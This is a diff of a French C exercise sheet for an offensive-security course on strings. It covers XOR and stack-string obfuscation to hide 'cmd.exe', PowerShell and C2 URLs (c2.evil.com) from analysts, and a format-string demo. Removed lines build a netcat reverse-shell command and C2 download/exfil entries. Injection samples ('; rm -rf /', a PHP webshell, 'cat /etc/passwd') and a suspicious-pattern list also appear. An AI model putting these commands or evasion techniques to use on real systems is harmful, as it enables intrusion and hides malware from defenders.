@@ -1,302 +1,167 @@
-# Exercices - Module 08 : Strings (Chaînes de caractères)
+# Exercices - Module 08 : Strings
 
-## Exercice 1 : Manipulation de base (Très facile)
+**Objectif** : Maîtriser les strings ET savoir les cacher.
 
-**Objectif** : Maîtriser les opérations de base sur les strings.
+Chaque exercice a un but offensif clair. Pas de "compter les voyelles".
 
-### Instructions
+---
+
+## Exo 1 : Audit de binaire (2 min)
+
+**But** : Voir ce que voit un analyste.
+
+```bash
+# 1. Compile ce code
+gcc -o test test.c
+
+# 2. Lance strings dessus
+strings test | grep -iE "password|admin|cmd|http|shell|secret"
+
+# 3. Note tout ce qui sort
+```
+
+**Questions** :
+- Quelles strings sensibles sont visibles ?
+- Comment un analyste pourrait les utiliser contre toi ?
+
+---
+
+## Exo 2 : Stack String (5 min)
+
+**But** : Faire disparaître `"cmd.exe"` du binaire.
 
 ```c
 #include <stdio.h>
-#include <string.h>
 
 int main(void) {
-    char text[] = "Offensive Security";
+    // ❌ VISIBLE dans strings
+    // char* cmd = "cmd.exe";
 
-    // TODO:
-    // 1. Affiche la string
-    // 2. Affiche sa longueur (strlen)
-    // 3. Affiche sizeof(text) et explique la différence
-    // 4. Affiche chaque caractère avec son index et code ASCII
+    // TODO: Construis "cmd.exe" caractère par caractère
+    // pour qu'il n'apparaisse PAS dans strings
+    char cmd[8];
+    // ... ton code ...
 
+    printf("Command: %s\n", cmd);
     return 0;
 }
 ```
 
----
-
-## Exercice 2 : Copie et concaténation (Facile)
-
-**Objectif** : Utiliser strcpy, strncpy, strcat, strncat.
-
-### Instructions
-
-```c
-#include <stdio.h>
-#include <string.h>
-
-int main(void) {
-    char src[] = "Payload";
-    char dst[50];
-    char prefix[50] = "Encoded_";
-
-    // TODO:
-    // 1. Copie src dans dst avec strcpy, affiche
-    // 2. Copie src dans un buffer de 5 bytes avec strncpy (attention!)
-    // 3. Concatène src à prefix avec strcat
-    // 4. Affiche tous les résultats
-
-    return 0;
-}
+**Vérification** :
+```bash
+gcc -o test test.c
+strings test | grep cmd
+# Doit retourner RIEN
 ```
 
 ---
 
-## Exercice 3 : Comparaison de strings (Facile)
+## Exo 3 : XOR Encoder (10 min)
 
-**Objectif** : Comparer des strings avec strcmp et strncmp.
-
-### Instructions
+**But** : Encoder/décoder une string avec XOR.
 
 ```c
 #include <stdio.h>
 #include <string.h>
 
-int main(void) {
-    char password_db[] = "admin123";
-    char attempts[][20] = {"admin", "admin123", "Admin123", "ADMIN123"};
-    int num_attempts = 4;
-
-    // TODO:
-    // 1. Pour chaque tentative, compare avec le mot de passe
-    // 2. Affiche si c'est correct ou incorrect
-    // 3. Explique pourquoi "Admin123" != "admin123"
-    // 4. BONUS: Implémente une comparaison case-insensitive
-
-    return 0;
+void xor_crypt(char* data, int len, char key) {
+    // TODO: XOR chaque byte avec la clé
 }
-```
 
----
-
-## Exercice 4 : Recherche dans les strings (Facile)
-
-**Objectif** : Utiliser strchr et strstr pour la recherche.
-
-### Instructions
-
-```c
-#include <stdio.h>
-#include <string.h>
-
-int main(void) {
-    char url[] = "https://admin:password123@target.com:8080/admin/login?user=root";
-
-    // TODO:
-    // 1. Trouve la position du premier ':' (après https)
-    // 2. Trouve la position de '@' pour extraire les credentials
-    // 3. Cherche si "admin" est présent dans l'URL
-    // 4. Cherche si "/login" est présent
-    // 5. Extrais et affiche: protocole, user, password, host, port, path
-
-    return 0;
+void print_hex(char* data, int len) {
+    // TODO: Affiche en format "0x41, 0x42, ..."
 }
-```
-
----
-
-## Exercice 5 : ROT13 encoder (Moyen)
-
-**Objectif** : Implémenter l'encodage ROT13.
-
-### Instructions
-
-```c
-#include <stdio.h>
-#include <string.h>
-
-// TODO:
-// 1. Crée une fonction rot13 qui encode/décode un string
-// 2. ROT13 : chaque lettre est décalée de 13 positions
-//    'A' -> 'N', 'B' -> 'O', ..., 'Z' -> 'M'
-//    'a' -> 'n', 'b' -> 'o', ..., 'z' -> 'm'
-// 3. Les caractères non-alphabétiques restent inchangés
 
 int main(void) {
-    char message[] = "Attack at midnight";
-
-    printf("Original: %s\n", message);
-
-    // TODO: Encode
-    // Affiche: "Nggnpx ng zvqavtug"
-
-    // TODO: Decode (rot13 à nouveau)
-    // Affiche: "Attack at midnight"
-
-    return 0;
-}
-```
-
----
-
-## Exercice 6 : XOR string encoder (Moyen)
-
-**Objectif** : Encoder une string avec XOR.
-
-### Instructions
-
-```c
-#include <stdio.h>
-#include <string.h>
-
-int main(void) {
-    char secret[] = "C2_SERVER_192.168.1.100";
+    char secret[] = "http://c2.evil.com";
     int len = strlen(secret);
-    unsigned char key = 0x42;
+    char key = 0x42;
+
+    printf("Original: %s\n", secret);
 
     // TODO:
-    // 1. Affiche la string originale
-    // 2. Encode avec XOR et affiche en hex
-    // 3. Décode et vérifie que c'est identique
-    // 4. BONUS: Génère du code C pour le payload encodé:
-    //    unsigned char encoded[] = {0xXX, 0xXX, ...};
+    // 1. Encode
+    // 2. Affiche en hex (pour copier dans ton code)
+    // 3. Decode
+    // 4. Vérifie que c'est identique
 
     return 0;
 }
 ```
 
+**Output attendu** :
+```
+Original: http://c2.evil.com
+Encoded: 0x2A, 0x36, 0x36, 0x32, ...
+Decoded: http://c2.evil.com
+```
+
 ---
 
-## Exercice 7 : String obfuscation (Moyen)
+## Exo 4 : Générateur de payload (10 min)
 
-**Objectif** : Cacher des strings sensibles dans le binaire.
-
-### Instructions
+**But** : Générer du code C avec strings encodées.
 
 ```c
 #include <stdio.h>
 #include <string.h>
 
 int main(void) {
-    // Ces strings seraient visibles avec 'strings' sur le binaire
-    // char cmd[] = "cmd.exe";
-    // char arg[] = "/c whoami";
-
-    // TODO:
-    // 1. Crée une fonction qui décode une string encodée
-    // 2. Stocke "cmd.exe" encodé en XOR avec clé 0x55
-    // 3. Stocke "/c whoami" encodé de la même façon
-    // 4. Décode à l'exécution
-    // 5. Affiche les strings décodées
-
-    // Encoded data (calculé à l'avance):
-    // 'c'^0x55 = 0x36, 'm'^0x55 = 0x38, 'd'^0x55 = 0x31, etc.
-
-    return 0;
-}
-```
-
----
-
-## Exercice 8 : Parser HTTP request (Moyen)
-
-**Objectif** : Parser une requête HTTP.
-
-### Instructions
-
-```c
-#include <stdio.h>
-#include <string.h>
-
-int main(void) {
-    char request[] = "POST /api/login HTTP/1.1\r\n"
-                     "Host: target.com\r\n"
-                     "Content-Type: application/json\r\n"
-                     "Content-Length: 45\r\n"
-                     "\r\n"
-                     "{\"username\":\"admin\",\"password\":\"secret\"}";
-
-    // TODO:
-    // 1. Extrais la méthode (POST)
-    // 2. Extrais le path (/api/login)
-    // 3. Extrais la version HTTP (HTTP/1.1)
-    // 4. Extrais le Host header
-    // 5. Extrais le body JSON
-    // 6. Affiche toutes ces informations
-
-    return 0;
-}
-```
-
----
-
-## Exercice 9 : Validation d'input (Moyen)
-
-**Objectif** : Détecter les tentatives d'injection.
-
-### Instructions
-
-```c
-#include <stdio.h>
-#include <string.h>
-
-// Patterns dangereux à détecter
-const char *dangerous[] = {
-    "<?php", "<%", "$(", "`", "&&", "||", ";",
-    "../", "..\\", "<script", "javascript:",
-    "SELECT", "INSERT", "DELETE", "DROP", "UNION"
-};
-int num_dangerous = 15;
-
-int main(void) {
-    char inputs[][100] = {
-        "Hello World",
-        "<?php system($_GET['cmd']); ?>",
-        "; rm -rf /",
-        "../../../etc/passwd",
-        "'; DROP TABLE users; --",
-        "Normal text here",
-        "<script>alert('XSS')</script>"
+    char* strings_to_hide[] = {
+        "cmd.exe",
+        "powershell.exe",
+        "/c whoami",
+        "http://192.168.1.100:8080"
     };
-    int num_inputs = 7;
+    int count = 4;
+    char key = 0x55;
 
-    // TODO:
-    // 1. Pour chaque input, vérifie s'il contient un pattern dangereux
-    // 2. Affiche [SAFE] ou [DANGEROUS: pattern trouvé]
-    // 3. Compte le nombre d'inputs dangereux
+    // TODO: Pour chaque string, génère du code C comme :
+    // unsigned char str_0[] = {0x36, 0x38, 0x31, ...}; // "cmd.exe"
+
+    printf("// Generated payload - key: 0x%02X\n\n", key);
+
+    // ... ton code ...
 
     return 0;
 }
 ```
 
+**Output attendu** :
+```c
+// Generated payload - key: 0x55
+
+unsigned char str_0[] = {0x36, 0x38, 0x31, 0x6B, 0x30, 0x39, 0x30, 0x00}; // cmd.exe
+unsigned char str_1[] = {0x25, 0x3A, 0x22, ...}; // powershell.exe
+// etc.
+```
+
 ---
 
-## Exercice 10 : Base64 simple (Challenge)
+## Exo 5 : Safe strcpy (5 min)
 
-**Objectif** : Comprendre le fonctionnement de Base64.
-
-### Instructions
+**But** : Écrire une copie sécurisée.
 
 ```c
 #include <stdio.h>
 #include <string.h>
 
-const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-
-// TODO:
-// 1. Implémente base64_encode qui encode une string
-//    - Prend 3 bytes, produit 4 caractères
-//    - Utilise le padding '=' si nécessaire
-// 2. Teste avec "Hello" -> "SGVsbG8="
-// 3. Teste avec "Man" -> "TWFu"
+int safe_strcpy(char* dst, const char* src, size_t max_len) {
+    // TODO:
+    // 1. Copie au max (max_len - 1) caractères
+    // 2. Ajoute TOUJOURS le '\0'
+    // 3. Retourne le nombre de chars copiés
+    // 4. Si src est NULL, ne fait rien et retourne 0
+}
 
 int main(void) {
-    char input[] = "Attack";
-    char encoded[100] = {0};
+    char small_buf[8];
+    char* long_string = "This is a very long string that would overflow";
 
-    printf("Input: %s\n", input);
-    // TODO: Encode en base64
-    printf("Base64: %s\n", encoded);
+    int copied = safe_strcpy(small_buf, long_string, sizeof(small_buf));
+
+    printf("Copied %d chars: '%s'\n", copied, small_buf);
+    // Attendu: "Copied 7 chars: 'This is'"
 
     return 0;
 }
@@ -304,44 +169,34 @@ int main(void) {
 
 ---
 
-## Exercice 11 : Format string exploitation (Challenge)
+## Exo 6 : Détecteur de strings (10 min)
 
-**Objectif** : Comprendre les vulnérabilités format string.
-
-### Instructions
+**But** : Trouver les strings suspectes dans un buffer.
 
 ```c
 #include <stdio.h>
 #include <string.h>
 
-// NOTE: Ceci est pour l'éducation uniquement!
-// Ne jamais écrire du code vulnérable en production.
+const char* suspicious[] = {
+    "cmd", "powershell", "wget", "curl",
+    "http://", "https://", "/bin/sh",
+    "base64", "eval(", "exec("
+};
+int num_suspicious = 10;
 
-void vulnerable_log(char *message) {
-    // VULNÉRABLE - NE PAS FAIRE EN PRODUCTION
-    printf(message);
-    printf("\n");
-}
-
-void safe_log(char *message) {
-    // SÉCURISÉ
-    printf("%s\n", message);
+int scan_buffer(const char* data, int len) {
+    // TODO:
+    // 1. Cherche chaque pattern suspect dans data
+    // 2. Retourne le nombre de matches
+    // 3. Affiche chaque match trouvé
 }
 
 int main(void) {
-    int secret = 0xDEADBEEF;
+    char sample[] = "Normal text cmd.exe more text http://evil.com end";
 
-    // TODO:
-    // 1. Appelle vulnerable_log avec "Hello World" - normal
-    // 2. Appelle vulnerable_log avec "%x %x %x %x" - que se passe-t-il?
-    // 3. Appelle safe_log avec "%x %x %x %x" - que se passe-t-il?
-    // 4. Explique la différence et le danger
-
-    printf("[*] Adresse de secret: %p\n", (void*)&secret);
-
-    // TODO: Teste les deux fonctions
-    char input1[] = "Hello World";
-    char input2[] = "%x %x %x %x";
+    printf("Scanning: %s\n\n", sample);
+    int matches = scan_buffer(sample, strlen(sample));
+    printf("\nTotal matches: %d\n", matches);
 
     return 0;
 }
@@ -349,79 +204,9 @@ int main(void) {
 
 ---
 
-## Exercice 12 : Shellcode string builder (Challenge)
+## Exo 7 : URL Parser (15 min)
 
-**Objectif** : Construire dynamiquement une commande.
-
-### Instructions
-
-```c
-#include <stdio.h>
-#include <string.h>
-
-int main(void) {
-    char target_ip[] = "192.168.1.100";
-    int target_port = 4444;
-
-    char command[256];
-
-    // TODO:
-    // 1. Construis la commande: "nc 192.168.1.100 4444 -e /bin/sh"
-    //    en utilisant snprintf de façon sécurisée
-    // 2. Vérifie que le buffer n'overflow pas
-    // 3. Affiche la commande construite
-    // 4. BONUS: Encode la commande en base64
-
-    return 0;
-}
-```
-
----
-
-## Exercice 13 : Password generator (Challenge)
-
-**Objectif** : Générer des mots de passe aléatoires.
-
-### Instructions
-
-```c
-#include <stdio.h>
-#include <stdlib.h>
-#include <time.h>
-#include <string.h>
-
-int main(void) {
-    char lowercase[] = "abcdefghijklmnopqrstuvwxyz";
-    char uppercase[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-    char digits[] = "0123456789";
-    char special[] = "!@#$%^&*()_+-=[]{}|;:,.<>?";
-
-    char all_chars[100];
-    char password[17];  // 16 chars + null
-
-    // TODO:
-    // 1. Combine tous les charset dans all_chars
-    // 2. Génère un mot de passe de 16 caractères aléatoires
-    // 3. Vérifie qu'il contient au moins:
-    //    - 1 minuscule
-    //    - 1 majuscule
-    //    - 1 chiffre
-    //    - 1 caractère spécial
-    // 4. Affiche le mot de passe généré
-
-    srand(time(NULL));
-
-    return 0;
-}
-```
-
----
-
-## Exercice 14 : C2 command encoder (Challenge)
-
-**Objectif** : Encoder des commandes C2.
-
-### Instructions
+**But** : Extraire les composants d'une URL (utile pour C2).
 
 ```c
 #include <stdio.h>
@@ -429,27 +214,35 @@ int main(void) {
 #include <stdlib.h>
 
 typedef struct {
-    int id;
-    char command[100];
-    char args[200];
-} C2Command;
+    char protocol[16];
+    char host[256];
+    int port;
+    char path[256];
+} URL;
+
+int parse_url(const char* url_string, URL* result) {
+    // TODO: Parse "http://host.com:8080/path/to/resource"
+    // Remplis la struct URL
+    // Retourne 1 si succès, 0 si échec
+}
 
 int main(void) {
-    C2Command cmds[] = {
-        {1, "whoami", ""},
-        {2, "download", "http://evil.com/payload.exe"},
-        {3, "execute", "calc.exe"},
-        {4, "screenshot", "desktop.png"},
-        {5, "exfil", "/etc/passwd"}
-    };
-    int num_cmds = 5;
+    URL parsed;
 
-    // TODO:
-    // 1. Pour chaque commande, crée un format: "ID|COMMAND|ARGS"
-    // 2. Encode le résultat en XOR avec clé 0xAA
-    // 3. Affiche en hex
-    // 4. Crée une fonction qui décode et parse
-    // 5. Vérifie que le decode donne l'original
+    char* urls[] = {
+        "http://c2.evil.com:8080/beacon",
+        "https://192.168.1.100/upload",
+        "http://localhost:4444"
+    };
+
+    for (int i = 0; i < 3; i++) {
+        if (parse_url(urls[i], &parsed)) {
+            printf("Protocol: %s\n", parsed.protocol);
+            printf("Host: %s\n", parsed.host);
+            printf("Port: %d\n", parsed.port);
+            printf("Path: %s\n\n", parsed.path);
+        }
+    }
 
     return 0;
 }
@@ -457,23 +250,140 @@ int main(void) {
 
 ---
 
-## Auto-évaluation
+## Exo 8 : Format String (Comprendre le danger)
 
-Avant de passer au module suivant, vérifie que tu sais :
+**But** : Voir pourquoi `printf(user_input)` est dangereux.
 
-- [ ] Déclarer et initialiser des strings
-- [ ] Utiliser strlen, strcpy, strcat, strcmp
-- [ ] Rechercher avec strchr et strstr
-- [ ] Implémenter ROT13 et XOR encoding
-- [ ] Obfusquer des strings sensibles
-- [ ] Parser des strings complexes (HTTP, URLs)
-- [ ] Détecter des patterns dangereux
-- [ ] Comprendre les vulnérabilités format string
-- [ ] Construire des commandes dynamiquement
-- [ ] Encoder des données pour C2
+```c
+#include <stdio.h>
+
+void vulnerable(const char* input) {
+    printf(input);  // ❌ DANGEREUX
+    printf("\n");
+}
+
+void safe(const char* input) {
+    printf("%s\n", input);  // ✅ SAFE
+}
+
+int main(void) {
+    int secret = 0xDEADBEEF;
+
+    printf("Adresse de secret: %p\n", (void*)&secret);
+    printf("Valeur de secret: 0x%X\n\n", secret);
+
+    // Test 1: Input normal
+    printf("=== Test normal ===\n");
+    vulnerable("Hello World");
+    safe("Hello World");
+
+    // Test 2: Input malicieux
+    printf("\n=== Test malicieux ===\n");
+    vulnerable("%x %x %x %x %x %x");  // Que se passe-t-il ?
+    safe("%x %x %x %x %x %x");        // Et là ?
+
+    return 0;
+}
+```
+
+**Questions** :
+1. Que vois-tu avec `vulnerable("%x %x %x %x")` ?
+2. Pourquoi `safe()` n'a pas le même comportement ?
+3. Comment un attaquant pourrait exploiter ça ?
+
+---
+
+## Exo 9 : Command Builder (10 min)
+
+**But** : Construire des commandes de façon sécurisée.
+
+```c
+#include <stdio.h>
+#include <string.h>
+
+int build_command(char* out, size_t max_len,
+                  const char* binary, const char* args) {
+    // TODO:
+    // 1. Vérifie que binary et args ne contiennent pas de ';', '|', '&'
+    // 2. Construit la commande de façon sécurisée
+    // 3. Retourne 1 si OK, 0 si injection détectée
+}
+
+int main(void) {
+    char cmd[256];
+
+    // Cas normal
+    if (build_command(cmd, sizeof(cmd), "ping", "-c 1 127.0.0.1")) {
+        printf("OK: %s\n", cmd);
+    }
+
+    // Tentative d'injection
+    if (build_command(cmd, sizeof(cmd), "ping", "-c 1 127.0.0.1; cat /etc/passwd")) {
+        printf("OK: %s\n", cmd);
+    } else {
+        printf("BLOCKED: Injection detected!\n");
+    }
+
+    return 0;
+}
+```
+
+---
+
+## Exo 10 : Macro Obfuscation (Challenge - 15 min)
+
+**But** : Créer des macros pour encoder au compile-time.
+
+```c
+#include <stdio.h>
+
+#define KEY 0x5A
+
+// TODO: Crée une macro qui XOR un char au compile-time
+#define X(c) ((c) ^ KEY)
+
+int main(void) {
+    // La string est encodée dans le binaire
+    char encoded[] = {
+        X('h'), X('e'), X('l'), X('l'), X('o'), X('\0')
+    };
+
+    // Décode au runtime
+    for (int i = 0; encoded[i]; i++) {
+        encoded[i] ^= KEY;
+    }
+
+    printf("Decoded: %s\n", encoded);  // "hello"
+
+    // TODO: Fais pareil pour "cmd.exe /c whoami"
+
+    return 0;
+}
+```
+
+**Vérification** :
+```bash
+strings test | grep -i "hello\|cmd\|whoami"
+# Doit retourner RIEN
+```
+
+---
+
+## Checklist finale
+
+```
+□ Je sais auditer un binaire avec strings
+□ Je sais construire une stack string
+□ Je sais encoder/décoder avec XOR
+□ Je sais générer du code avec strings cachées
+□ J'ai écrit une safe_strcpy
+□ Je comprends le danger de printf(user_input)
+□ Je sais construire des commandes sans injection
+□ Je sais utiliser des macros pour l'obfuscation
+```
 
 ---
 
 ## Solutions
 
-Voir [solution.md](solution.md) pour les solutions commentées.
+Voir [solution.md](solution.md)
